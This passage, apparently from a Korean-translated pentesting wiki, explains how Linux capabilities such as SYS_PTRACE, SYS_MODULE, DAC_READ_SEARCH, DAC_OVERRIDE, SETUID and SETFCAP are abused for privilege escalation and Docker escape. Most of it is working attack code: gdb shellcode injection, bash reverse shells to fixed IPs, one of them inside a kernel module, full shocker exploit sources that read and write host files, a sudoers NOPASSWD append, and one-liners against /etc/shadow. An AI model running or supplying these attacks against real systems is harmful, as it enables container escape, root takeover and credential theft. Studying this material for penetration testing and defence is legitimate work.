buf += b"\x6a\x03\x5e\x48\xff\xce\x6a\x21\x58\x0f\x05\x75"
buf += b"\xf6\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f"
buf += b"\x73\x68\x00\x53\x48\x89\xe7\x52\x57\x48\x89\xe6"
buf += b"\x0f\x05"

# Divisible by 8
payload = b"\x90" * (8 - len(buf) % 8 ) + buf

# Change endianess and print gdb lines to load the shellcode in RIP directly
for i in range(0, len(buf), 8):
chunk = payload[i:i+8][::-1]
chunks = "0x"
for byte in chunk:
chunks += f"{byte:02x}"

print(f"set {{long}}($rip+{i}) = {chunks}")
```
루트 프로세스를 gdb로 디버깅하고 이전에 생성된 gdb 라인을 복사하여 붙여넣으세요:

```bash
$ gdb -p <pid>
(gdb) set follow-fork-mode child
(gdb) set detach-on-fork off
(gdb) catch exec
(gdb) run
```

```bash
$ gdb -p <pid>
(gdb) set follow-fork-mode child
(gdb) set detach-on-fork off
(gdb) catch exec
(gdb) run
```
```bash
# In this case there was a sleep run by root
## NOTE that the process you abuse will die after the shellcode
/usr/bin/gdb -p $(pgrep sleep)
[...]
(gdb) set {long}($rip+0) = 0x296a909090909090
(gdb) set {long}($rip+8) = 0x5e016a5f026a9958
(gdb) set {long}($rip+16) = 0x0002b9489748050f
(gdb) set {long}($rip+24) = 0x48510b0e0a0a2923
(gdb) set {long}($rip+32) = 0x582a6a5a106ae689
(gdb) set {long}($rip+40) = 0xceff485e036a050f
(gdb) set {long}($rip+48) = 0x6af675050f58216a
(gdb) set {long}($rip+56) = 0x69622fbb4899583b
(gdb) set {long}($rip+64) = 0x8948530068732f6e
(gdb) set {long}($rip+72) = 0x050fe689485752e7
(gdb) c
Continuing.
process 207009 is executing new program: /usr/bin/dash
[...]
```
**환경 예시 (Docker 탈출) - 다른 gdb 남용**

만약 **GDB**가 설치되어 있다면 (또는 `apk add gdb` 또는 `apt install gdb`와 같은 명령으로 설치할 수 있음), 호스트에서 프로세스를 디버깅하고 `system` 함수를 호출하게 할 수 있습니다. (이 기술은 또한 `SYS_ADMIN` 능력이 필요합니다).
```bash
gdb -p 1234
(gdb) call (void)system("ls")
(gdb) call (void)system("sleep 5")
(gdb) call (void)system("bash -c 'bash -i >& /dev/tcp/192.168.115.135/5656 0>&1'")
```
명령이 실행되지만 해당 프로세스에서 출력을 볼 수는 없습니다 (따라서 rev 쉘을 얻을 수 있습니다).

{% hint style="warning" %}
"현재 컨텍스트에서 'system' 기호를 찾을 수 없습니다."라는 오류가 발생하면 이전 예제에서 gdb를 통해 프로그램에 쉘코드를 로드하는 것을 확인하세요.
{% endhint %}

**환경을 사용한 예제 (도커 탈출) - 쉘코드 삽입**

도커 컨테이너 내에서 활성화된 기능을 확인할 수 있습니다.
```bash
capsh --print
Current: = cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_sys_ptrace,cap_mknod,cap_audit_write,cap_setfcap+ep
Bounding set =cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_sys_ptrace,cap_mknod,cap_audit_write,cap_setfcap
Securebits: 00/0x0/1'b0
secure-noroot: no (unlocked)
secure-no-suid-fixup: no (unlocked)
secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root
```
호스트에서 실행 중인 프로세스 목록을 가져옵니다. `ps -eaf`

1. 아키텍처를 가져옵니다. `uname -m`
2. 해당 아키텍처용 쉘코드를 찾습니다. ([https://www.exploit-db.com/exploits/41128](https://www.exploit-db.com/exploits/41128))
3. 쉘코드를 프로세스 메모리에 주입하는 프로그램을 찾습니다. ([https://github.com/0x00pf/0x00sec\_code/blob/master/mem\_inject/infect.c](https://github.com/0x00pf/0x00sec\_code/blob/master/mem\_inject/infect.c))
4. 프로그램 내의 쉘코드를 수정하고 컴파일합니다. `gcc inject.c -o inject`
5. 주입하고 쉘을 획득합니다: `./inject 299; nc 172.17.0.1 5600`

## CAP\_SYS\_MODULE

**[`CAP_SYS_MODULE`](https://man7.org/linux/man-pages/man7/capabilities.7.html)**은 프로세스가 커널 모듈을 로드하고 언로드(`init_module(2)`, `finit_module(2)` 및 `delete_module(2)` 시스템 호출)할 수 있는 권한을 제공합니다. 이는 커널의 핵심 작업에 직접 액세스할 수 있게 해주는데, 이는 권한 상승과 전체 시스템 침투를 가능하게 합니다. 이로 인해 Linux 보안 메커니즘, Linux Security Modules 및 컨테이너 격리를 포함한 모든 Linux 보안 메커니즘을 우회할 수 있습니다.
**즉, 호스트 머신의 커널에 커널 모듈을 삽입/제거할 수 있습니다.**

**바이너리를 사용한 예시**

다음 예시에서는 **`python`** 바이너리가 이 권한을 가지고 있습니다.
```bash
getcap -r / 2>/dev/null
/usr/bin/python2.7 = cap_sys_module+ep
```
기본적으로 **`modprobe`** 명령은 의존성 목록과 맵 파일을 **`/lib/modules/$(uname -r)`** 디렉토리에서 확인합니다.\
이를 악용하기 위해 가짜 **lib/modules** 폴더를 생성해 봅시다:
```bash
mkdir lib/modules -p
cp -a /lib/modules/5.0.0-20-generic/ lib/modules/$(uname -r)
```
그런 다음 커널 모듈을 컴파일하고 아래에 2개의 예제를 찾아서 해당 폴더로 복사하세요.
```bash
cp reverse-shell.ko lib/modules/$(uname -r)/
```
마지막으로, 이 커널 모듈을 로드하기 위해 필요한 파이썬 코드를 실행하세요:
```python
import kmod
km = kmod.Kmod()
km.set_mod_dir("/path/to/fake/lib/modules/5.0.0-20-generic/")
km.modprobe("reverse-shell")
```
**바이너리를 사용한 예시**

다음 예시에서는 **`kmod`** 바이너리가 이 능력(capability)을 가지고 있습니다.
```bash
getcap -r / 2>/dev/null
/bin/kmod = cap_sys_module+ep
```
이는 커널 모듈을 삽입하기 위해 **`insmod`** 명령을 사용할 수 있다는 것을 의미합니다. 이 권한을 악용하여 **reverse shell**을 얻기 위해 아래 예시를 따르세요.

**환경 예시 (Docker 탈출)**

Docker 컨테이너 내에서 활성화된 기능을 확인하려면 다음을 사용할 수 있습니다:
```bash
capsh --print
Current: = cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_module,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap+ep
Bounding set =cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_module,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
Securebits: 00/0x0/1'b0
secure-noroot: no (unlocked)
secure-no-suid-fixup: no (unlocked)
secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root)
```
이전 출력에서 **SYS\_MODULE** 능력이 활성화되어 있는 것을 확인할 수 있습니다.

**리버스 쉘을 실행**할 **커널 모듈**과 **컴파일**하기 위한 **Makefile**을 **생성**하세요:

{% code title="reverse-shell.c" %}
```c
#include <linux/kmod.h>
#include <linux/module.h>
MODULE_LICENSE("GPL");
MODULE_AUTHOR("AttackDefense");
MODULE_DESCRIPTION("LKM reverse shell module");
MODULE_VERSION("1.0");

char* argv[] = {"/bin/bash","-c","bash -i >& /dev/tcp/10.10.14.8/4444 0>&1", NULL};
static char* envp[] = {"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin", NULL };

// call_usermodehelper function is used to create user mode processes from kernel space
static int __init reverse_shell_init(void) {
return call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
}

static void __exit reverse_shell_exit(void) {
printk(KERN_INFO "Exiting\n");
}

module_init(reverse_shell_init);
module_exit(reverse_shell_exit);
```
{% code title="Makefile" %}
```bash
obj-m +=reverse-shell.o

all:
make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules

clean:
make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
```
{% endcode %}

{% hint style="warning" %}
Makefile에서 각 make 단어 앞의 공백 문자는 **탭이어야 합니다. 스페이스가 아닙니다**!
{% endhint %}

`make`를 실행하여 컴파일하세요.
```
ake[1]: *** /lib/modules/5.10.0-kali7-amd64/build: No such file or directory.  Stop.

sudo apt update
sudo apt full-upgrade
```
마지막으로, 쉘 내에서 `nc`를 시작하고 다른 쉘에서 **모듈을 로드**한 다음 nc 프로세스에서 쉘을 캡처합니다:
```bash
#Shell 1
nc -lvnp 4444

#Shell 2
insmod reverse-shell.ko #Launch the reverse shell
```
**이 기술의 코드는** [**https://www.pentesteracademy.com/**](https://www.pentesteracademy.com) **의 "Abusing SYS\_MODULE Capability" 연구실에서 복사되었습니다.**

이 기술의 또 다른 예제는 [https://www.cyberark.com/resources/threat-research-blog/how-i-hacked-play-with-docker-and-remotely-ran-code-on-the-host](https://www.cyberark.com/resources/threat-research-blog/how-i-hacked-play-with-docker-and-remotely-ran-code-on-the-host)에서 찾을 수 있습니다.

## CAP\_DAC\_READ\_SEARCH

[**CAP\_DAC\_READ\_SEARCH**](https://man7.org/linux/man-pages/man7/capabilities.7.html)는 프로세스가 파일을 읽고 디렉토리를 읽고 실행하기 위한 권한 검사를 우회할 수 있게 합니다. 주로 파일 검색이나 읽기 목적으로 사용됩니다. 그러나 이 기능은 또한 프로세스가 `open_by_handle_at(2)` 함수를 사용할 수 있게 하여 프로세스의 마운트 네임스페이스 외부의 파일을 포함하여 모든 파일에 액세스할 수 있습니다. `open_by_handle_at(2)`에서 사용되는 핸들은 `name_to_handle_at(2)`를 통해 얻은 투명하지 않은 식별자여야 하지만, 조작에 취약한 inode 번호와 같은 민감한 정보를 포함할 수 있습니다. 특히 Docker 컨테이너의 문맥에서 이 기능을 악용할 수 있는 가능성은 Sebastian Krahmer에 의해 shocker exploit으로 증명되었으며, [여기](https://medium.com/@fun_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3)에서 분석되었습니다.
**즉, 파일 읽기 권한 검사 및 디렉토리 읽기/실행 권한 검사를 우회할 수 있습니다.**

**바이너리를 사용한 예제**

바이너리는 모든 파일을 읽을 수 있습니다. 따라서 tar와 같은 파일이 이 기능을 가지고 있다면 shadow 파일을 읽을 수 있습니다:
```bash
cd /etc
tar -czf /tmp/shadow.tar.gz shadow #Compress show file in /tmp
cd /tmp
tar -cxf shadow.tar.gz
```
**binary2 예시**

이 경우에는 **`python`** 바이너리가 이 능력을 가지고 있다고 가정해 봅시다. 루트 파일을 나열하기 위해서는 다음과 같이 할 수 있습니다:
```python
import os
for r, d, f in os.walk('/root'):
for filename in f:
print(filename)
```
그리고 파일을 읽기 위해서는 다음을 수행할 수 있습니다:
```python
print(open("/etc/shadow", "r").read())
```
**환경 예시 (Docker 탈출)**

다음을 사용하여 도커 컨테이너 내에서 활성화된 기능을 확인할 수 있습니다:
```
capsh --print
Current: = cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap+ep
Bounding set =cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
Securebits: 00/0x0/1'b0
secure-noroot: no (unlocked)
secure-no-suid-fixup: no (unlocked)
secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root)
```
이전 출력에서는 **DAC\_READ\_SEARCH** 능력이 활성화되어 있음을 확인할 수 있습니다. 결과적으로 컨테이너는 **프로세스 디버깅**을 할 수 있습니다.

다음의 공격 방법에 대해 자세히 알아보려면 [https://medium.com/@fun\_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3](https://medium.com/@fun\_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3)를 참조할 수 있지만, 요약하자면 **CAP\_DAC\_READ\_SEARCH**는 권한 확인 없이 파일 시스템을 탐색할 수 있을 뿐만 아니라 _**open\_by\_handle\_at(2)**_의 확인도 명시적으로 제거하며, 이로 인해 우리의 프로세스가 다른 프로세스가 열어 놓은 민감한 파일에 접근할 수 있습니다.

이 권한을 악용하여 호스트에서 파일을 읽는 원래의 공격은 다음에서 찾을 수 있습니다: [http://stealth.openwall.net/xSports/shocker.c](http://stealth.openwall.net/xSports/shocker.c). 다음은 **첫 번째 인수로 읽을 파일을 지정하고 파일로 덤프하는 수정된 버전**입니다.
```c
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <errno.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <dirent.h>
#include <stdint.h>

// gcc shocker.c -o shocker
// ./socker /etc/shadow shadow #Read /etc/shadow from host and save result in shadow file in current dir

struct my_file_handle {
unsigned int handle_bytes;
int handle_type;
unsigned char f_handle[8];
};

void die(const char *msg)
{
perror(msg);
exit(errno);
}

void dump_handle(const struct my_file_handle *h)
{
fprintf(stderr,"[*] #=%d, %d, char nh[] = {", h->handle_bytes,
h->handle_type);
for (int i = 0; i < h->handle_bytes; ++i) {
fprintf(stderr,"0x%02x", h->f_handle[i]);
if ((i + 1) % 20 == 0)
fprintf(stderr,"\n");
if (i < h->handle_bytes - 1)
fprintf(stderr,", ");
}
fprintf(stderr,"};\n");
}

int find_handle(int bfd, const char *path, const struct my_file_handle *ih, struct my_file_handle
*oh)
{
int fd;
uint32_t ino = 0;
struct my_file_handle outh = {
.handle_bytes = 8,
.handle_type = 1
};
DIR *dir = NULL;
struct dirent *de = NULL;
path = strchr(path, '/');
// recursion stops if path has been resolved
if (!path) {
memcpy(oh->f_handle, ih->f_handle, sizeof(oh->f_handle));
oh->handle_type = 1;
oh->handle_bytes = 8;
return 1;
}

++path;
fprintf(stderr, "[*] Resolving '%s'\n", path);
if ((fd = open_by_handle_at(bfd, (struct file_handle *)ih, O_RDONLY)) < 0)
die("[-] open_by_handle_at");
if ((dir = fdopendir(fd)) == NULL)
die("[-] fdopendir");
for (;;) {
de = readdir(dir);
if (!de)
break;
fprintf(stderr, "[*] Found %s\n", de->d_name);
if (strncmp(de->d_name, path, strlen(de->d_name)) == 0) {
fprintf(stderr, "[+] Match: %s ino=%d\n", de->d_name, (int)de->d_ino);
ino = de->d_ino;
break;
}
}

fprintf(stderr, "[*] Brute forcing remaining 32bit. This can take a while...\n");
if (de) {
for (uint32_t i = 0; i < 0xffffffff; ++i) {
outh.handle_bytes = 8;
outh.handle_type = 1;
memcpy(outh.f_handle, &ino, sizeof(ino));
memcpy(outh.f_handle + 4, &i, sizeof(i));
if ((i % (1<<20)) == 0)
fprintf(stderr, "[*] (%s) Trying: 0x%08x\n", de->d_name, i);
if (open_by_handle_at(bfd, (struct file_handle *)&outh, 0) > 0) {
closedir(dir);
close(fd);
dump_handle(&outh);
return find_handle(bfd, path, &outh, oh);
}
}
}
closedir(dir);
close(fd);
return 0;
}


int main(int argc,char* argv[] )
{
char buf[0x1000];
int fd1, fd2;
struct my_file_handle h;
struct my_file_handle root_h = {
.handle_bytes = 8,
.handle_type = 1,
.f_handle = {0x02, 0, 0, 0, 0, 0, 0, 0}
};

fprintf(stderr, "[***] docker VMM-container breakout Po(C) 2014 [***]\n"
"[***] The tea from the 90's kicks your sekurity again. [***]\n"
"[***] If you have pending sec consulting, I'll happily [***]\n"
"[***] forward to my friends who drink secury-tea too! [***]\n\n<enter>\n");

read(0, buf, 1);

// get a FS reference from something mounted in from outside
if ((fd1 = open("/etc/hostname", O_RDONLY)) < 0)
die("[-] open");

if (find_handle(fd1, argv[1], &root_h, &h) <= 0)
die("[-] Cannot find valid handle!");

fprintf(stderr, "[!] Got a final handle!\n");
dump_handle(&h);

if ((fd2 = open_by_handle_at(fd1, (struct file_handle *)&h, O_RDONLY)) < 0)
die("[-] open_by_handle");

memset(buf, 0, sizeof(buf));
if (read(fd2, buf, sizeof(buf) - 1) < 0)
die("[-] read");

printf("Success!!\n");

FILE *fptr;
fptr = fopen(argv[2], "w");
fprintf(fptr,"%s", buf);
fclose(fptr);

close(fd2); close(fd1);

return 0;
}
```
{% hint style="warning" %}
해당 exploit은 호스트에 마운트된 파일에 대한 포인터를 찾아야 합니다. 원래 exploit은 /.dockerinit 파일을 사용했으며, 이 수정된 버전은 /etc/hostname을 사용합니다. exploit이 작동하지 않는다면 다른 파일을 설정해야 할 수도 있습니다. 호스트에 마운트된 파일을 찾으려면 mount 명령을 실행하십시오:
{% endhint %}

![](<../../.gitbook/assets/image (407) (1).png>)

**이 기술의 코드는** [**https://www.pentesteracademy.com/**](https://www.pentesteracademy.com) **의 "Abusing DAC\_READ\_SEARCH Capability" 연구실에서 복사되었습니다.**

​

<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

​​​​​​​​​​​[**RootedCON**](https://www.rootedcon.com/)은 **스페인**에서 가장 중요한 사이버 보안 행사이자 **유럽**에서 가장 중요한 행사 중 하나입니다. **기술적인 지식을 촉진하는 미션**을 가지고 있는 이 회의는 모든 분야의 기술 및 사이버 보안 전문가들에게 열정적인 만남의 장입니다.

{% embed url="https://www.rootedcon.com/" %}

## CAP\_DAC\_OVERRIDE

**이는 모든 파일에 대한 쓰기 권한 검사를 우회할 수 있으므로, 모든 파일에 쓸 수 있습니다.**

**권한 상승을 위해 덮어쓸 수 있는 많은 파일이 있습니다,** [**여기에서 아이디어를 얻을 수 있습니다**](payloads-to-execute.md#overwriting-a-file-to-escalate-privileges).

**바이너리를 사용한 예시**

이 예시에서는 vim이 이 기능을 가지고 있으므로, _passwd_, _sudoers_ 또는 _shadow_와 같은 모든 파일을 수정할 수 있습니다:
```bash
getcap -r / 2>/dev/null
/usr/bin/vim = cap_dac_override+ep

vim /etc/sudoers #To overwrite it
```
**예제 2**

이 예제에서는 **`python`** 바이너리가 이 능력을 가지게 됩니다. Python을 사용하여 어떤 파일이든 덮어쓸 수 있습니다:
```python
file=open("/etc/sudoers","a")
file.write("yourusername ALL=(ALL) NOPASSWD:ALL")
file.close()
```
**환경 + CAP_DAC_READ_SEARCH (Docker 탈출) 예시**

다음 명령어를 사용하여 도커 컨테이너 내에서 활성화된 기능을 확인할 수 있습니다:
```bash
capsh --print
Current: = cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap+ep
Bounding set =cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
Securebits: 00/0x0/1'b0
secure-noroot: no (unlocked)
secure-no-suid-fixup: no (unlocked)
secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root)
```
먼저, 호스트의 임의 파일을 읽기 위해 [**DAC\_READ\_SEARCH 능력을 악용하는**](linux-capabilities.md#cap\_dac\_read\_search) 이전 섹션을 읽으세요. 그리고 **exploit을 컴파일**하세요.\
그런 다음, 호스트 파일 시스템에 **임의의 파일을 작성할 수 있는** 다음 버전의 shocker exploit을 **컴파일**하세요.
```c
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <errno.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <dirent.h>
#include <stdint.h>

// gcc shocker_write.c -o shocker_write
// ./shocker_write /etc/passwd passwd

struct my_file_handle {
unsigned int handle_bytes;
int handle_type;
unsigned char f_handle[8];
};
void die(const char * msg) {
perror(msg);
exit(errno);
}
void dump_handle(const struct my_file_handle * h) {
fprintf(stderr, "[*] #=%d, %d, char nh[] = {", h -> handle_bytes,
h -> handle_type);
for (int i = 0; i < h -> handle_bytes; ++i) {
fprintf(stderr, "0x%02x", h -> f_handle[i]);
if ((i + 1) % 20 == 0)
fprintf(stderr, "\n");
if (i < h -> handle_bytes - 1)
fprintf(stderr, ", ");
}
fprintf(stderr, "};\n");
}
int find_handle(int bfd, const char *path, const struct my_file_handle *ih, struct my_file_handle *oh)
{
int fd;
uint32_t ino = 0;
struct my_file_handle outh = {
.handle_bytes = 8,
.handle_type = 1
};
DIR * dir = NULL;
struct dirent * de = NULL;
path = strchr(path, '/');
// recursion stops if path has been resolved
if (!path) {
memcpy(oh -> f_handle, ih -> f_handle, sizeof(oh -> f_handle));
oh -> handle_type = 1;
oh -> handle_bytes = 8;
return 1;
}
++path;
fprintf(stderr, "[*] Resolving '%s'\n", path);
if ((fd = open_by_handle_at(bfd, (struct file_handle * ) ih, O_RDONLY)) < 0)
die("[-] open_by_handle_at");
if ((dir = fdopendir(fd)) == NULL)
die("[-] fdopendir");
for (;;) {
de = readdir(dir);
if (!de)
break;
fprintf(stderr, "[*] Found %s\n", de -> d_name);
if (strncmp(de -> d_name, path, strlen(de -> d_name)) == 0) {
fprintf(stderr, "[+] Match: %s ino=%d\n", de -> d_name, (int) de -> d_ino);
ino = de -> d_ino;
break;
}
}
fprintf(stderr, "[*] Brute forcing remaining 32bit. This can take a while...\n");
if (de) {
for (uint32_t i = 0; i < 0xffffffff; ++i) {
outh.handle_bytes = 8;
outh.handle_type = 1;
memcpy(outh.f_handle, & ino, sizeof(ino));
memcpy(outh.f_handle + 4, & i, sizeof(i));
if ((i % (1 << 20)) == 0)
fprintf(stderr, "[*] (%s) Trying: 0x%08x\n", de -> d_name, i);
if (open_by_handle_at(bfd, (struct file_handle * ) & outh, 0) > 0) {
closedir(dir);
close(fd);
dump_handle( & outh);
return find_handle(bfd, path, & outh, oh);
}
}
}
closedir(dir);
close(fd);
return 0;
}
int main(int argc, char * argv[]) {
char buf[0x1000];
int fd1, fd2;
struct my_file_handle h;
struct my_file_handle root_h = {
.handle_bytes = 8,
.handle_type = 1,
.f_handle = {
0x02,
0,
0,
0,
0,
0,
0,
0
}
};
fprintf(stderr, "[***] docker VMM-container breakout Po(C) 2014 [***]\n"
"[***] The tea from the 90's kicks your sekurity again. [***]\n"
"[***] If you have pending sec consulting, I'll happily [***]\n"
"[***] forward to my friends who drink secury-tea too! [***]\n\n<enter>\n");
read(0, buf, 1);
// get a FS reference from something mounted in from outside
if ((fd1 = open("/etc/hostname", O_RDONLY)) < 0)
die("[-] open");
if (find_handle(fd1, argv[1], & root_h, & h) <= 0)
die("[-] Cannot find valid handle!");
fprintf(stderr, "[!] Got a final handle!\n");
dump_handle( & h);
if ((fd2 = open_by_handle_at(fd1, (struct file_handle * ) & h, O_RDWR)) < 0)
die("[-] open_by_handle");
char * line = NULL;
size_t len = 0;
FILE * fptr;
ssize_t read;
fptr = fopen(argv[2], "r");
while ((read = getline( & line, & len, fptr)) != -1) {
write(fd2, line, read);
}
printf("Success!!\n");
close(fd2);
close(fd1);
return 0;
}
```
도커 컨테이너를 탈출하기 위해 호스트에서 `/etc/shadow`와 `/etc/passwd` 파일을 **다운로드**하여 새로운 사용자를 **추가**하고, **`shocker_write`**를 사용하여 이들을 덮어쓸 수 있습니다. 그런 다음 **ssh**를 통해 액세스할 수 있습니다.

**이 기술의 코드는** [**https://www.pentesteracademy.com**](https://www.pentesteracademy.com) **의 "Abusing DAC\_OVERRIDE Capability" 실험실에서 복사되었습니다.**

## CAP\_CHOWN

**이는 모든 파일의 소유권을 변경할 수 있다는 것을 의미합니다.**

**바이너리를 사용한 예시**

**`python`** 바이너리가 이 권한을 가지고 있다고 가정해 봅시다. 그렇다면 **shadow** 파일의 **소유자**를 **변경**하고 **root 암호를 변경**하여 권한을 상승시킬 수 있습니다.
```bash
python -c 'import os;os.chown("/etc/shadow",1000,1000)'
```
또는 **`ruby`** 이진 파일에 이 능력을 가지게 할 수도 있습니다:
```bash
ruby -e 'require "fileutils"; FileUtils.chown(1000, 1000, "/etc/shadow")'
```
## CAP\_FOWNER

**이는 모든 파일의 권한을 변경할 수 있다는 것을 의미합니다.**

**바이너리를 사용한 예시**

만약 파이썬이 이러한 능력을 가지고 있다면, 그것을 사용하여 shadow 파일의 권한을 수정하고, **루트 비밀번호를 변경**하고, 권한을 상승시킬 수 있습니다.
```bash
python -c 'import os;os.chmod("/etc/shadow",0666)
```
### CAP\_SETUID

**이는 생성된 프로세스의 effective user id를 설정할 수 있는 것을 의미합니다.**

**바이너리를 사용한 예시**

만약 파이썬이 이 **권한**을 가지고 있다면, 권한 상승을 위해 매우 쉽게 root 권한을 얻을 수 있습니다:
```python
import os
os.setuid(0)
os.system("/bin/bash")
```
**다른 방법:**
```python
import os
import prctl
#add the capability to the effective set
prctl.cap_effective.setuid = True
os.setuid(0)
os.system("/bin/bash")
```
## CAP\_SETGID

**이는 생성된 프로세스의 유효 그룹 ID를 설정할 수 있는 것을 의미합니다.**

권한 상승을 위해 덮어쓸 수 있는 많은 파일들이 있습니다. [여기에서 아이디어를 얻을 수 있습니다](payloads-to-execute.md#overwriting-a-file-to-escalate-privileges).

**바이너리를 사용한 예시**

이 경우에는 그룹이 읽을 수 있는 흥미로운 파일을 찾아야 합니다. 왜냐하면 어떤 그룹이든지 가장할 수 있기 때문입니다:
```bash
#Find every file writable by a group
find / -perm /g=w -exec ls -lLd {} \; 2>/dev/null
#Find every file writable by a group in /etc with a maxpath of 1
find /etc -maxdepth 1 -perm /g=w -exec ls -lLd {} \; 2>/dev/null
#Find every file readable by a group in /etc with a maxpath of 1
find /etc -maxdepth 1 -perm /g=r -exec ls -lLd {} \; 2>/dev/null
```
한 번 파일을 찾았다면 (읽기 또는 쓰기를 통해) 권한 상승을 위해 **흥미로운 그룹을 표현하는 쉘을 얻을 수 있습니다**. 다음과 같이 하면 됩니다:
```python
import os
os.setgid(42)
os.system("/bin/bash")
```
이 경우 그룹 shadow가 위장되어 파일 `/etc/shadow`를 읽을 수 있습니다:
```bash
cat /etc/shadow
```
만약 **도커**가 설치되어 있다면, **도커 그룹**을 **사칭**하여 [**도커 소켓과 권한 상승**](./#writable-docker-socket)을 악용할 수 있습니다.

## CAP\_SETFCAP

**이는 파일과 프로세스에 권한을 설정할 수 있다는 것을 의미합니다.**

**바이너리 예시**

만약 파이썬이 이 **권한**을 가지고 있다면, 권한 상승을 위해 아주 쉽게 악용할 수 있습니다:

{% code title="setcapability.py" %}
```python
import ctypes, sys

#Load needed library
#You can find which library you need to load checking the libraries of local setcap binary
# ldd /sbin/setcap
libcap = ctypes.cdll.LoadLibrary("libcap.so.2")

libcap.cap_from_text.argtypes = [ctypes.c_char_p]
libcap.cap_from_text.restype = ctypes.c_void_p
libcap.cap_set_file.argtypes = [ctypes.c_char_p,ctypes.c_void_p]

#Give setuid cap to the binary
cap = 'cap_setuid+ep'
path = sys.argv[1]
print(path)
cap_t = libcap.cap_from_text(cap)
status = libcap.cap_set_file(path,cap_t)

if(status == 0):
print (cap + " was successfully added to " + path)
```
{% code %}
```bash
python setcapability.py /usr/bin/python2.7
```
{% hint style="warning" %}
새로운 기능을 CAP\_SETFCAP으로 이진 파일에 설정하면이 기능을 잃게됩니다.
{% endhint %}

[SETUID 기능](linux-capabilities.md#cap\_setuid)을 얻으면 권한 상승 방법을 확인하기 위해 해당 섹션으로 이동할 수 있습니다.

**환경 예시 (Docker 탈출)**

기본적으로 **Docker 컨테이너 내부의 프로세스에는 CAP\_SETFCAP 기능이 부여**됩니다. 다음과 같이 확인할 수 있습니다:
```bash
cat /proc/`pidof bash`/status | grep Cap
CapInh: 00000000a80425fb
CapPrm: 00000000a80425fb
CapEff: 00000000a80425fb
CapBnd: 00000000a80425fb
CapAmb: 0000000000000000

capsh --decode=00000000a80425fb
0x00000000a80425fb=cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
```
이 능력은 이진 파일에 **다른 모든 능력을 부여**할 수 있게 해줍니다. 따라서 이 페이지에서 언급된 다른 능력 탈출 중 하나를 **이용하여 컨테이너를 탈출**할 수 있습니다.\
그러나 예를 들어 gdb 이진 파일에 CAP\_SYS\_ADMIN 및 CAP\_SYS\_PTRACE 능력을 부여하려고 하면, 이 능력을 부여할 수는 있지만, **이후에는 이진 파일을 실행할 수 없게 됩니다**.
```bash
getcap /usr/bin/gdb
/usr/bin/gdb = cap_sys_ptrace,cap_sys_admin+eip

setcap cap_sys_admin,cap_sys_ptrace+eip /usr/bin/gdb

/usr/bin/gdb
bash: /usr/bin/gdb: Operation not permitted
```
[문서에서](https://man7.org/linux/man-pages/man7/capabilities.7.html): _Permitted: 이것은 스레드가 가질 수 있는 **유효한 기능의 제한된 상위 집합**입니다. 이것은 또한 CAP\_SETPCAP 기능을 유효한 집합에 가지고 있지 않은 스레드가 상속 가능한 집합에 추가할 수 있는 기능의 제한된 상위 집합입니다._\
Permitted 기능은 사용할 수 있는 기능을 제한하는 것 같습니다.\
그러나 Docker는 기본적으로 CAP\_SETPCAP도 부여하므로 **상속 가능한 기능 내에 새로운 기능을 설정**할 수 있을 수도 있습니다.\
그러나 이 기능의 문서에서는 다음과 같이 설명하고 있습니다. _CAP\_SETPCAP : \[...\] 호출 스레드의 bounding 집합에서 상속 가능한 집합으로 어떤 기능이든 추가합니다._\
